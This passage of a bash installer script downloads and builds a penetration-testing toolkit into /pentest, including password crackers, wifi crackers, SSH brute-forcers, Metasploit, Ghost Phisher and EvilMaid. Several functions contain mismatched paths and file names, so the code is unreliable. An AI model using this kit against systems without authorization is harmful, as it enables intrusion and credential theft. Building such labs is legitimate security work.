echo "    Compiling Aircrack-ng ... "
cd aircrack-ng
make sqlite=true unstable=true 1> /dev/null
make sqlite=true unstable=true install 1> /dev/null
cd ..
rm -fr aircrack-ng

cd $home

time_stop

}

f_aircrack_ng_cuda () { # libssl-dev libpcap-dev sqlite3

echo -n "[*] Installing Aircrack-ng ... "

cd /pentest

echo "    Downloading SubVersion Source Code ... "
svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng 1> /dev/null

echo "    Compiling Aircrack-ng-Cuda ... "
cd aircrack-ng-cuda
make CUDA=true sqlite=true unstable=true 1> /dev/null
make CUDA=true sqlite=true unstable=true install 1> /dev/null
cd ..
rm -fr aircrack-ng-cuda

cd $home

}

f_airoscript () {

echo -n "  [*] Installing Airoscript ... "

timelapsed &

cd /pentest

svn co http://trac.aircrack-ng.org/svn/branch/airoscript-ng/ airoscript-ng  1> /dev/null
cd airoscript-ng
make  1> /dev/null

cd ..
rm -fr airoscript-ng

cd $home

time_stop

}

f_bluediving () { # BlueZ Sox obexftp GnuReadlinelibrary XML::Simple

echo -n "  [*] Installing BlueDiving ... "

timelapsed &

cd /pentest

axel http://sourceforge.net/projects/bluediving/files/bluediving/bluediving-0.9/bluediving-0.9.tgz 1> /dev/null

tar xvfz bluediving-0.9.tgz 1> /dev/null

rm -f bluediving-0.9.tgz

cd $home

time_stop


}

f_brutessh () {

echo -n "  [*] Installing BruteSsh ... "

timelapsed &

cd /pentest

axel http://www.edge-security.com/soft/brutessh-0.5.tar.bz2 1> /dev/null

tar xvfj brutessh-0.5.tar.bz2 1> /dev/null

rm -f brutessh-0.5.tar.bz2

cd $home

time_stop

}

f_catdoc () {

echo -n "  [*] Installing CatDoc ... "

timelapsed &

cd /pentest

axel http://ftp.wagner.pp.ru/pub/catdoc/catdoc-0.94.2.tar.gz 1> /dev/null

tar xvfz catdoc-0.94.2.tar.gz 1> /dev/null

cd catdoc-0.94.2

./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd ..
rm -fr catdoc-0.94.2

cd $home

time_stop

}

f_cewl_buntu_debian () {

echo -n "  [*] Installing Cewl ... "

timelapsed &

cd /pentest

apt-get install -y --force-yes gem rubygems graphviz ruby1.8-dev build-essential rubygems-doc ruby 1> /dev/null 2> $LOG
apt-get install -y --force-yes libopenssl-ruby 1> /dev/null 2> $LOG
apt-get install -y --force-yes exif exifprobe exiftags exiftran gpscorrelate-gui 1> /dev/null 2> $LOG

axel http://www.digininja.org/files/cewl_3.0.tar.bz2 1> /dev/null
tar xvfj cewl_3.0.tar.bz2 1> /dev/null
rm -f cewl_3.0.tar.bz2

gem install hpricot 1> /dev/null
gem install http_configuration 1> /dev/null
gem install mime-types 1> /dev/null
gem install mini_exiftool 1> /dev/null
gem install rubyzip 1> /dev/null
gem install spider 1> /dev/null

echo 'export RUBYOPT=!rubygems!' | sed -e 's|!|/|g' >> $home/.bashrc

cd $home

time_stop

}

f_chntpw () {

echo -n "  [*] Installing Chntpw ... "

timelapsed &

cd /pentest

axel http://pogostick.net/~pnh/ntpasswd/chntpw-source-110511.zip 1> /dev/null

unzip chntpw-source-110511.zip 1> /dev/null

cd chntpw-110511

make > /dev/null

cd ..

mv chntpw-110511 chntpw

ls -fs /pentest/chntpw/chntpw /usr/local/bin

cd $home

time_stop

}

f_cowpatty () {

echo -n "  [*] Installing Cowpatty ... "

timelapsed &

cd /pentest

axel http://wirelessdefence.org/Contents/Files/cowpatty-4.6.tgz 1> /dev/null
tar xvfz cowpatty-4.6.tgz 1> /dev/null
rm -f cowpatty-4.6.tgz
cd cowpatty-4.6
make 1> /dev/null

ln -sf cowpatty /usr/local/bin
ln -sf genpmk /usr/local/bin

cd $home

time_stop

}

f_crark () {

echo -n "[*] Installing Crark ... "

timelapsed &

cd /pentest

mkdir -p crark33

cd cracrk33

axel http://www.crark.net/download/crark33-linux.rar 1> /dev/null

unrar x e crark33-linux.rar 1> /dev/null

rm -f crark33-linux.rar

cp english.def password.def

ln -fs /pentest/crark33/crark /usr/local/bin
ln -fs /pentest/crack33/crark-hp /usr/local/bin

cd $home

time_stop

}

f_creepy () {

cd /pentest

echo -n "[*] Installing Creepy ... "

timelapsed &

cd /pentest

git clone git://github.com/ilektrojohn/creepy 1> /dev/null

cd $home

time_stop

}

f_crunch () {

echo -n "[*] Installing Crunch ... "

timelapsed &

cd /pentest

axel http://heanet.dl.sourceforge.net/project/crunch-wordlist/crunch-wordlist/crunch-3.1.tgz  1> /dev/null
tar xvfz crunch-3-1.tgz  1> /dev/null
cd crunch3-1  1> /dev/null
make  1> /dev/null
make install  1> /dev/null

cd ..
rm -f crunch-3-1.tgz
ln -fs /pentest/crunch3-1/crunch /usr/local/bin

cd $home

time_stop

}

f_cudamultiforcer () {

echo -n "[*] Installing Cuda-Multiforcer ... "

timelapsed &

cd /pentest

axel http://cryptohaze.com/releases/CUDA-Multiforcer-Linux-0.72.tar.bz2 1> /dev/null

tar xfvi CUDA-Multiforcer-Linux-0.72.tar.bz2 1> /dev/null

rm -f CUDA-Multiforcer-0.72.tar.bz2 1> /dev/null

ln -fs /pentest/CUDA-Multiforcer-linux-0.72/CUDA-Multiforcer /usr/local/bin/cuda-multiforcer

cd $home

time_stop

}

f_database () { # perl libnet-dns-perl libnet-pcap-perl libio-socket-ssl-perl libnet-rawip-perl libnetpacket-perl

echo -n "[*] Installing Database Pentesting Software ... "

timelapsed &

cd /pentest

mkdir -p Database
cd Database

svn co https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap 1> /dev/null

axel http://downloads.sourceforge.net/sqlninja/sqlninja-0.2.5.tgz 1> /dev/null
tar xvfz sqlninja-0.2.5.tgz 1> /dev/null

ln -fs /pentest/Database/sqlninja-0.2.5/sqlninja /usr/local/bin

rm -f sqlmap-0.9.tar.gz
rm -f sqlninja-0.2.5.tgz

cd $home

time_stop

}

f_dcrack () {

echo -n "[*] Installing Dcrack ... "

timelapsed &

cd /pentest

axel http://reusablesec.googlepages.com/drcrack.tar 1> /dev/null

tar xvf drcrack.tar  1> /dev/null

cd current_version

make 1> /dev/null

cd ..

rm -f drcrack.tar

mv /pentest/current_version /pentest/drcrack

ln -sf /pentest/drcrack/drcrack /usr/local/bin
ln -sf /pentest/drcrack/dr_rules /usr/local/bin
ln -sf /pentest/drcrack/drtgen /usr/local/bin
ln -sf /pentest/drcrack/rcalc_raw /usr/local/bin
ln -sf /pentest/drcrack/rtdump /usr/local/bin
ln -sf /pentest/drcrack/rtsort /usr/local/bin

cd /pentest/drcrack

echo "
echo
echo lm
echo ntlm
echo md2
echo md4
echo md5
echo doublemd5
echo sha1
echo ripemd160
echo mysql323
echo mysqlbsha1
echo ciscopix
echo mscache
echo halflmchall
echo lmchall
echo ntlmchall
echo oracle
echo
" >> supported_hash_type.sh

cd $home

time_stop

}

f_driftnet () {

echo -n "[*] Installing Driftnet ... "

timelapsed &

cd /pentest

git clone https://github.com/wertarbyte/driftnet.git

cd driftnet

make 1> /dev/null 2> $LOG

ln -fs /pentest/driftnet/driftnet /usr/local/bin/driftnet

cd $HOME

#apt-get install -y --force-yes driftnet 1> /dev/null 2> $LOG

}

f_dsniff_buntu_debian () {

echo -n "[*] Installing Dsinff ... "

timelapsed &

apt-get install -y --force-yes dsniff 1> /dev/null

time_stop

}

f_ettercap_buntu_command () {

echo -n "[*] Installing Ettercap ... "

timelapsed &

apt-get install -y --force-yes ettercap 1> /dev/null 2> $LOG

time_stop

}

f_ettercap_buntu_gui () {

echo -n "[*] Installing Ettercap ... "

timelapsed &

apt-get install -y --force-yes ettercap-gtk 1> /dev/null 2> $LOG

time_stop

}

f_ettercap_debian_command () {

echo -n "[*] Installing Ettercap ... "

timelapsed &

apt-get install -y --force-yes ettercap-text-only 1> /dev/null 2> $LOG

time_stop

}

f_ettercap_debian_gui () {

echo -n "[*] Installing Ettercap ... "

timelapsed &

apt-get install -y --force-yes ettercap-graphical 1> /dev/null 2> $LOG

time_stop

}

f_evilmaid () {

echo -n "[*] Installing EvilMaid ... "

timelapsed &

cd /pentest

mkdir -p EvilMaid

cd EvilMaid

axel http://invisiblethingslab.com/resources/evilmaid/evilmaidusb-1.01.img 1> /dev/null

axel http://invisiblethingslab.com/resources/evilmaid/evilmaid-src-1.0.tgz 1> /dev/null

rm -f evilmaid.sh
touch evilmaid.sh

f_writing_evilmaid () {

echo "
" | sed -e 's/£+/"/g' | sed -e 's/SsSs/$/g' >> 	evilmaid.sh

}

cd $home

time_stop

}

f_exiftool () { # perl

echo -n "[*] Installing ExifTool ... "

timelapsed &

cd /pentest

axel http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-8.39.tar.gz 1> /dev/null

tar xvfz Image-ExifTool-8.39.tar.gz 1> /dev/null
rm -f Image-ExifTool-8.39.tar.gz
cd Image-ExifTool-8.39
perl Makefile.PL 1> /dev/null
make install 1> /dev/null

cd ..
rm -fr Image-ExifTool-8.39

cd $home

time_stop

}

f_exploit_db () {

echo -n "[*] Installing ExifTool ... "

timelapsed &

cd /pentest
mkdir -p exploitdb
cd exploitdb

svn co svn://devel.offensive-security.com/exploitdb	1> /dev/null

cd $home

time_stop

}

f_fern_wifi_cracker () { # python python-qt4 macchanger aircrack-ng xterm subversion

cd /pentest

echo -n "[*] Installing Fern-Wifi-Cracker ... "

timelapsed &

svn checkout http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/ 1> /dev/null

cd $home

time_stop

}

f_geoedge () {

echo -n "[*] Installing GeoEdge ... "

timelapsed &

cd /pentest

axel http://www.edge-security.com/soft/geoedge.py 1> /dev/null

cd $home

time_stop

}

f_ghost_pisher () { # python python-qt4 dhcp3-server ettercap-gtk

echo -n "[*] Installing Ghost Phisher ... "

timelapsed &

cd /pentest

svn checkout http://ghost-phisher.googlecode.com/svn/Ghost-Phisher

cd $home

time_stop

}

f_ham_ferr () {

echo -n "[*] Installing Hamster & Ferret ... "

timelapsed &

cd /pentest

axel http://www.erratasec.com/erratasec.zip 1> /dev/null

unzip erratasec.zip 1> /dev/null

rm -f erratasec.zip

cd /pentest/hamster/build/gcc4/
make 1> /dev/null

cd /pentest/ferret/build/gcc4/
make 1> /dev/null

cd $home

time_stop

}

f_harvester () {

echo -n "[*] Installing TheHarvester ... "

timelapsed &

cd /pentest

axel http://www.edge-security.com/soft/theHarvester-ng-2.0.tar 1> /dev/null

tar xvfz theHarvester-ng-2.0.tar 1> /dev/null

rm -f theHarvester-ng-2.0.tar

cd $home

}

f_hashcat_cpu () {

echo -n "[*] Installing HashCat ... "

timelapsed &

cd /pentest

axel http://hashcat.net/files/oclHashcat+-0.08.7z?d=i22npmm5gmj2trptvibsfvslk5 1> /dev/null

7z x oclHashcat+-0.03.7z 1> /dev/null

ln /pentest/oclHashcat+-0.03/oclHashcat+32.bin /usr/local/bin/oclhashcat

cd ..

rm -fr oclHashcat

cd $home

time_stop

}

f_hashcat_cpu_gui () {

echo -n "[*] Installing HashCat Gui ... "

timelapsed &

cd /pentest

axel http://hashcat.net/files/oclHashcat+-0.03.7z?d=i22npmm5gmj2trptvibsfvslk5 1> /dev/null

7z x oclHashcat+-0.03.7z 1> /dev/null

ln /pentest/oclHashcat+-0.03/oclHashcat+32.bin /usr/local/bin/oclhashcat

cd ..

rm -fr oclHashcat

cd $home

time_stop

}

f_hashcat_ocl_plus () {

echo -n "[*] Installing OclHashCatPlus ... "

timelapsed &

cd /pentest

axel http://hashcat.net/files/download.php?proj=oclHashcat-plus 1> /dev/null

7z x oclHashcat+-0.03.7z 1> /dev/null

ln /pentest/oclHashcat+-0.03/oclHashcat+32.bin /usr/local/bin/oclhashcat

cd ..

rm -fr oclHashcat

cd $home

time_stop

}

f_hashcat_ocl_lite () {

echo -n "[*] Installing OclHashCatLite ... "

timelapsed &

cd /pentest

axel http://hashcat.net/files/oclHashcat+-0.03.7z?d=i22npmm5gmj2trptvibsfvslk5 1> /dev/null

7z x oclHashcat+-0.03.7z 1> /dev/null

ln /pentest/oclHashcat+-0.03/oclHashcat+32.bin /usr/local/bin/oclhashcat

cd $home

time_stop

}

f_hexor_base () { # python python-qt python psycopg2 python-scintilla python-pymssql python.mysqldb

echo -n "[*] Installing Hexor ... "

timelapsed &

cd /pentest

mkdir -p Database

cd Database

svn checkout http://hexorbase.googlecode.com/svn/HexorBase/ hexorbase

cd $home

time_stop

}

f_html2text () {

echo -n "[*] Installing Html2Text ... "

timelapsed &

axel http://www.mbayer.de/html2text/downloads/html2text-1.3.2a.tar.gz 1> /dev/null

tar xvfz html2text-1.3.2a.tar.gz 1> /dev/null

cd html2text-1.3.2a

./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd ..

rm -f html2text-1.3.2a.tar.gz
rm -fr html2text-1.3.2a

cd $home

time_stop

}

f_hydra () { # libssh-dev libpcre3-dev libpq-dev libsvn-dev libaprutil1-dev libapr1-dev libmysqlclient-dev libncp-dev pkg-config libgtk2.0-dev libcln-dev

echo -n "[*] Installing Hydra ... "

timelapsed &

cd /pentest

axel http://www.thc.org/releases/hydra-7.0-src.tar.gz 1> /dev/null

tar xvfz hydra-7.0-src.tar.gz 1> /dev/null

cd hydra-7.0-src

./configure -DWITH_SSH1=On 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd ..

rm -fr hydra-7.0-src
rm -f hydra-7.0-src.tar.gz

cd $home

time_stop

}

f_john () {

echo -n "[*] John the Ripper"

timelapsed &

cd /pentest

echo "    Downloading John Jumbo Source Code ... "
axel http://www.openwall.com/john/g/john-1.7.8-jumbo-5.tar.gz 1> /dev/null
tar xfvz john-1.7.8-jumbo-5.tar.gz 1> /dev/null
rm -f john-1.7.8-jumbo-5.tar.gz
cd john-1.7.8-jumbo-5

echo "    Appling Patches ... "
patch -p1 < ../john-1.7.8-jumbo-5-opencl-1.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/john-1.7.8-jumbo-6-RC1.diff.gz 1> /dev/null
gzip -dc ../john-1.7.8-jumbo-6-RC1.diff.gz | patch -p1 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0001_2-j6-Config-changes-include-syntax-and-mingw-path-fixes.diff 1> /dev/null
patch -p1 < ../0001_2-j6-Config-changes-include-syntax-and-mingw-path-fixes.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0003-j6-pkzip-format-OMP-fixes-1.diff 1> /dev/null
patch -p1 < ../0003-j6-pkzip-format-OMP-fixes-1.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0003-j6-pkzip-format-OMP-fixes-2.diff 1> /dev/null
patch -p1 < ../0003-j6-pkzip-format-OMP-fixes-2.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0004-update-to-config-changes.diff 1> /dev/null
patch -p1 < ../0004-update-to-config-changes.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0005-proper-config-filename-errors-1.diff 1> /dev/null
patch -p1 < ../0005-proper-config-filename-errors-1.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0006-Fixes-two-ancient-incremental-mode-MPI-bugs.patch 1> /dev/null
patch -p1 < ../0006-Fixes-two-ancient-incremental-mode-MPI-bugs.patch 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0007-Duplicate-Rules-Removal-2.diff 1> /dev/null
patch -p1 < ../0007-Duplicate-Rules-Removal-2.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0008-remove-CR-s-from-wordlist.c-log_event.patch 1> /dev/null
patch -p1 < ../0008-remove-CR-s-from-wordlist.c-log_event.patch 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0009-N-reject-flag-reject-unless-length-N-is-supported.patch 1> /dev/null
patch -p1 < ../0009-N-reject-flag-reject-unless-length-N-is-supported.patch 1> /dev/null

cd src
echo "    Compiling John The Ripper (x86-Sse2) ... "
make clean linux-x86-sse2
cd ..
cd ..

ln -sf /pentest/john-1.7.8-jumbo-5/run/john /usr/local/bin/
ln -sf /pentest/john-1.7.8-jumbo-5/run/drar /usr/local/bin/
ln -sf /pentest/john-1.7.8-jumbo-5/run/unshadow /usr/local/bin/

cd $home

time_stop

}

f_john_opencl () {

echo -n "[*] John the Ripper (with Opencl)"

timelapsed &

cd /pentest

echo "    Downloading John Jumbo Source Code ... "
axel http://www.openwall.com/john/g/john-1.7.8-jumbo-5.tar.gz 1> /dev/null
tar xfvz john-1.7.8-jumbo-5.tar.gz 1> /dev/null
rm -f john-1.7.8-jumbo-5.tar.gz
cd john-1.7.8-jumbo-5

echo "    Appling Patches ... "
axel http://www.openwall.info/wiki/_media/john/john-1.7.8-jumbo-5-opencl-1.diff.bz2 1> /dev/null
bz2 -d john-1.7.8-jumbo-5-opencl-1.diff.bz2 john-1.7.8-jumbo-5-opencl-1.diff 1> /dev/null
patch -p1 < ../john-1.7.8-jumbo-5-opencl-1.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/john-1.7.8-jumbo-6-RC1.diff.gz 1> /dev/null
gzip -dc ../john-1.7.8-jumbo-6-RC1.diff.gz | patch -p1 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0001_2-j6-Config-changes-include-syntax-and-mingw-path-fixes.diff 1> /dev/null
patch -p1 < ../0001_2-j6-Config-changes-include-syntax-and-mingw-path-fixes.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0003-j6-pkzip-format-OMP-fixes-1.diff 1> /dev/null
patch -p1 < ../0003-j6-pkzip-format-OMP-fixes-1.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0003-j6-pkzip-format-OMP-fixes-2.diff 1> /dev/null
patch -p1 < ../0003-j6-pkzip-format-OMP-fixes-2.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0004-update-to-config-changes.diff 1> /dev/null
patch -p1 < ../0004-update-to-config-changes.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0005-proper-config-filename-errors-1.diff 1> /dev/null
patch -p1 < ../0005-proper-config-filename-errors-1.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0006-Fixes-two-ancient-incremental-mode-MPI-bugs.patch 1> /dev/null
patch -p1 < ../0006-Fixes-two-ancient-incremental-mode-MPI-bugs.patch 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0007-Duplicate-Rules-Removal-2.diff 1> /dev/null
patch -p1 < ../0007-Duplicate-Rules-Removal-2.diff 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0008-remove-CR-s-from-wordlist.c-log_event.patch 1> /dev/null
patch -p1 < ../0008-remove-CR-s-from-wordlist.c-log_event.patch 1> /dev/null
axel http://www.openwall.info/wiki/_media/john/john-1.7.8/0009-N-reject-flag-reject-unless-length-N-is-supported.patch 1> /dev/null
patch -p1 < ../0009-N-reject-flag-reject-unless-length-N-is-supported.patch 1> /dev/null

cd src
echo "    Compiling John The Ripper (x86-Sse2-Opencl) ... "
make clean linux-x86-sse2-opencl
cd ..
cd ..

ln -sf /pentest/john-1.7.8-jumbo-5/run/john /usr/local/bin/
ln -sf /pentest/john-1.7.8-jumbo-5/run/drar /usr/local/bin/
ln -sf /pentest/john-1.7.8-jumbo-5/run/unshadow /usr/local/bin/

cd $home

time_stop

}

f_id3V2 () {

echo -n "[*] Installing id3V2 ... "

timelapsed &

cd /opt
mkdir -p local
cd local
mkdir -p bin
mkdir -p share
cd share
mkdir -p man
cd man
mkdir -p man1

cd /pentest

axel http://fastbull.dl.sourceforge.net/project/id3v2/id3v2/0.1.12/id3v2-0.1.12.tar.gz 1> /dev/null

tar xvfz id3v2-0.1.12.tar.gz 1> /dev/null

cd id3v2-0.1.12

make install 1> /dev/null

cd ..

rm -f id3v2-0.1.12.tar.gz
rm -fr id3v2-0.1.12

ln -sf /opt/local/bin/id3v2 /usr/local/bin

cd $home

time_stop

}

f_inguma () {

echo -n "[*] Installing Inguma ... "

timelapsed &

cd /pentest

axel http://heanet.dl.sourceforge.net/project/inguma/inguma/Inguma%200.1.0%20%28R1%29/inguma-0.1.1.tar.gz 1> /dev/null
tar xvzf inguma-0.1.1.tar.gz 1> /dev/null

rm -f inguma-0.1.1.tar.gz

cd $home

time_stop

}

f_leetify () { # perl

echo -n "[*] Installing leetify.pl ... "

timelapsed &

cd /pentest

rm -f leetify.pl
touch leetify.pl

echo "#!/usr/bin/env perl

use strict;
use warnings;
my %permution = (
£+a£+ => [ £+a£+, £+A£+, £+4£+, £+@£+, £+&£+ ];
£+b£+ => [ £+b£+, £+B£+, £+8£+ ];
£+c£+ => [£+c£+, £+C£+];
£+d£+ => [ £+d£+, £+D£+, £+|)£+ ];
£+e£+ => [ £+e£+, £+E£+, £+3£+ ];
£+f£+ => [ £+f£+, £+F£+ ];
£+g£+ => [ £+g£+, £+G£+, £+9£+ ];
£+h£+ => [ £+h£+, £+H£+ ];
£+i£+ => [ £+i£+, £+I£+, £+!£+, £+|£+, £+1£+, £+l£+ ];
£+j£+ => [ £+j£+ , £+J£+ ];
£+k£+ => [ £+k£+, £+K£+, £+|<£+ ];
£+l£+ => [ £+l£+, £+L£+, £+!£+, £+!_£+, £+7£+, £+1£+, £+|£+, £+|_£+ ];
£+m£+ => [ £+m£+, £+M£+ ];
£+n£+ => [ £+n£+, £+N£+ ];
£+o£+ => [ £+o£+, £+O£+, £+0£+, £+()£+ ];
£+p£+ => [ £+p£+, £+P£+ ];
£+q£+ => [£+q£+, £+Q£+ ];
£+r£+ => [ £+r£+, £+R£+, £+|2£+ ];
£+s£+ => [ £+s£+, £+S£+, £+5£+, £+\$£+ ];
£+t£+ => [£+t£+, £+T£+, £+7£+, £+1£+, £++£+];
£+u£+ => [£+u£+, £+U£+];
£+v£+ => [ £+v£+, £+V£+ ];
£+w£+ => [£+w£+, £+W£+ ];
£+x£+ => [ £+x£+, £+X£+ ];
£+y£+ => [ £+y£+, £+Y£+ ];
£+z£+ => [£+z£+, £+Z£+, £+2£+ ];
);
# End config

while (my $word = <>) {
chomp $word;
my @string = split //, lc($word);
permute(0, @string);
}
sub permute {
my $num = shift;
my @str = @_;
my $len = @str;
if ($num >= $len) {
foreach my $char (@str) {
print $char;
}
print £+\n£+;
return;
}
my $per = $permution{$str[$num]};
if ($per) {
my @letters = ();
if (ref($per) eq ''ARRAY'') {
@letters = @$per;
} else {
@letters = split //, $per;
}
$per = £+£+;
foreach $per (@letters) {
my $s = £+£+;
for (my $i = 0; $i < $len; ++$i) {
if ($i eq 0) {
if ($i eq $num) {
$s = $per;
} else {
$s = $str[0];
}
} else {
if ($i eq $num) {
$s .= $per;
} else {
$s .= $str[$i];
}
}
}
my @st = split //, $s;
permute(($num + 1), @st);
}
} else {
permute(($num + 1), @str);
}
}

" >> leetify2.pl

cat leetify2.pl | sed -e 's/£+/"/g' >> leetify.pl
rm -f leetify2.pl

cd $home

time_stop

}

f_macchanger_command () {

echo -n "[*] Installing Macchanger ... "

timelapsed &

axel ftp://ftp.gnu.org/gnu/macchanger/macchanger-1.5.0.tar.gz 1> /dev/null

tar xvfz macchanger-1.5.0.tar.gz 1> /dev/null

cd macchanger-1.5.0

./configure 1> /dev/null

make 1> /dev/null

make install 1> /dev/null

cd ..

rm -fr macchanger-1.5.0
rm -f macchanger-1.5.0.tar.gz

cd $home

time_stop

}

f_macchanger_gui_buntu_debian () {

echo -n "[*] Installing Macchanger (Gui) ... "

timelapsed &

apt-get install -y --force-yes macchanger 1> /dev/null 2> $LOG
apt-get install -y --force-yes macchanger-gtk 1> /dev/null 2> $LOG

time_stop

}

f_mantra () {

echo -n "[*] Installing Mantra ... "

timelapsed &

cd /pentest

axel http://getmantra.googlecode.com/files/Mantra%20Security%20Toolkit%20-%20Gandiva.tar.bz2 1> /dev/null

tar xvfj "Mantra Security Toolkit - Gandiva.tar.bz2" 1> /dev/null

rm -f "Mantra Security Toolkit - Gandiva.tar.bz2"

cd $home

time_stop

}

f_mask_processor () {

echo -n "[*] Installing MaskProcessor ... "

timelapsed &

cd /pentest

axel http://hashcat.net/files/maskprocessor-0.67.7z 1> /dev/null 2> $LOG

7z x maskprocessor-0.67.7z 1> /dev/null 2> $LOG

rm -f maskprocessor-0.67.7z

ln /pentest/maskprocessor-0.67/mp32.bin /usr/local/bin/mp32

cd $home

time_stop

}

f_mediainfo_buntu_debian () {

echo -n "[*] Installing MediaInfo ... "

timelapsed &

cd /pentest

mkdir -p MediaInfo
cd MediaInfo

axel http://sourceforge.net/projects/zenlib/files/ZenLib/0.4.17/libzen0_0.4.17-1_i386.Ubuntu_9.10.deb 1> /dev/null
dpkg -i libzen0_0.4.17-1_i386.Ubuntu_9.10.deb 1> /dev/null

axel http://sourceforge.net/projects/mediainfo/files/binary/libmediainfo0/0.7.41/libmediainfo0_0.7.41-1_i386.Ubuntu_10.10.deb 1> /dev/null
dpkg -i libmediainfo0_0.7.41-1_i386.Ubuntu_10.10.deb 1> /dev/null

axel http://sourceforge.net/projects/mediainfo/files/binary/mediainfo/0.7.41/mediainfo_0.7.41-1_i386.Debian_5.deb 1> /dev/null
dpkg -i mediainfo_0.7.41-1_i386.Debian_5.deb 1> /dev/null

apt-get install -y --force-yes libwxgtk2.6-0 1> /dev/null 2> $LOG

axel http://sourceforge.net/projects/mediainfo/files/binary/mediainfo-gui/0.7.41/mediainfo-gui_0.7.41-1_i386.Debian_5.deb 1> /dev/null
dpkg -i mediainfo-gui_0.7.41-1_i386.Debian_5.deb 1> /dev/null

rm *.deb

cd ..

rm -fr MediaInfo

cd $home

time_stop

}

f_medusa_buntu_debian () {

echo -n "[*] Installing Medusa ... "

timelapsed &

apt-get install -y --force-yes medusa 1> /dev/null 2> $LOG

time_stop

}

f_metasploit_buntu_debian () {

# http://updates.metasploit.com/data/releases/framework-3.7.2-linux-full.run
# http://updates.metasploit.com/data/releases/framework-3.7.2-linux-x64-full.run

echo -n "[*] Installing Metasploit ... "

timelapsed &

# Framework
f_framework () { # ruby-full libruby ri rubygems subversion build-essential libpcap-dev

cd /pentest

echo "      Downloading Subversion Source Code ... "
svn co http://metasploit.com/svn/framework3/trunk metasploit 1> /dev/null

echo "      Compiling And Installing ... "
ln -sf /pentest/metasploit/msf* /usr/local/bin/
cd /pentest/metasploit/external/pcaprub/
ruby extconf.rb 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd $home

}

f_framework

# Lorcon2
f_lorcon2 () {

echo "       Installing Lorcon2 Patch ... "

cd  /pentest/metasploit3/msf3/external/ruby-lorcon2/

svn co http://802.11ninja.net/svn/lorcon/trunk lorcon2 1> /dev/null

cd lorcon2
./configure --prefix=/usr 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd ..

ruby extconf.rb 1> /dev/null

make 1> /dev/null
make install 1> /dev/null

cd $home

}

f_lorcon2

# Sound Recorder
f_sound_recorder () {

echo "       Installing SoundRecorder Script ... "

cd /pentest

axel http://www.darkoperator.com/meterpreter/soundrecorder.zip 1> /dev/null
unzip soundrecorder.zip 1> /dev/null

cd soundrecorder
cp soundrecorder.rb /pentest/metasploit3/msf3/scripts/meterpreter
cp linco.exe /pentest/metasploit3/msf3/data
cp oggenc.exe /pentest/metasploit3/msf3/data

cd ..
rm -f soundrecorder.zip
rm -fr soundrecorder

cd $home

}

f_sound_recorder

# Database
f_database_mysql () {

# f_mysql

echo "      Installing Database Driver (MySql) ... "

#      http://www.metasploit.com/redmine/projects/framework/wiki/Mysql_setup

apt-get install -y --force-yes mysql-server 1> /dev/null 2> $LOG
apt-get install -y --force-yes rubygems 1> /dev/null 2> $LOG
apt-get install -y --force-yes libmysqlclient-dev 1> /dev/null 2> $LOG
gem install mysql 1> /dev/null 2> $LOG
apt-get install -y --force-yes rubygems libpq-dev 1> /dev/null 2> $LOG
apt-get install -y --force-yes libreadline-dev 1> /dev/null 2> $LOG
apt-get install -y --force-yes libssl-dev 1> /dev/null 2> $LOG
apt-get install -y --force-yes libpq5 1> /dev/null 2> $LOG
apt-get install -y --force-yes ruby-dev 1> /dev/null 2> $LOG

cd $home

}

f_database_mysql

# Armitage  (Metasploit Gui)
f_armitage () {

echo "      Installing Armitage (Metasploit GUI) ... "

cd /pentest/metasploit3/

axel http://www.fastandeasyhacking.com/download/armitage112510.tgz 1> /dev/null

tar xvfz armitage112510.tgz 1> /dev/null

rm -f armitage112510.tgz

cd $home

}

f_armitage

time_stop

}

f_netcat_buntu_debian () {

echo -n "[*] Installing Netcat ... "

timelapsed &

apt-get install -y --force-yes netcat 1> /dev/null 2> $LOG

time_stop

}

f_netdiscover () { # libpcap-dev libnet-dev

echo -n "[*] Installing NetDiscover ... "

timelapsed &

cd /pentest

svn co https://netdiscover.svn.sourceforge.net/svnroot/netdiscover/trunk netdiscover 1> /dev/null 2> $LOG

cd netdiscover

./autogen.sh 1> /dev/null

./configure 1> /dev/null

make 1> /dev/null

make install 1> /dev/null

cd ..

rm -fr netdiscover

cd $home

time_stop

}

f_nikto () {

echo -n "[*] Installing Nikto ... "

timelapsed &

cd /pentest

svn co http://svn2.assembla.com/svn/Nikto_2/trunk/ nikto 1> /dev/null

cd $home

time_stop

}

f_nmap () {

echo -n "[*] Installing Nmap ... "

timelapsed &

cd /pentest

svn co --username guest --password "" svn://svn.insecure.org/nmap/.  1> /dev/null

cd nmap
./configure  1> /dev/null
make  1> /dev/null
make install  1> /dev/null

cd ..
rm -fr nmap

cd $home

time_stop

}

f_openvas_buntu_debian () { # rpm alien fakeroot sqlite3 libpcap-ruby

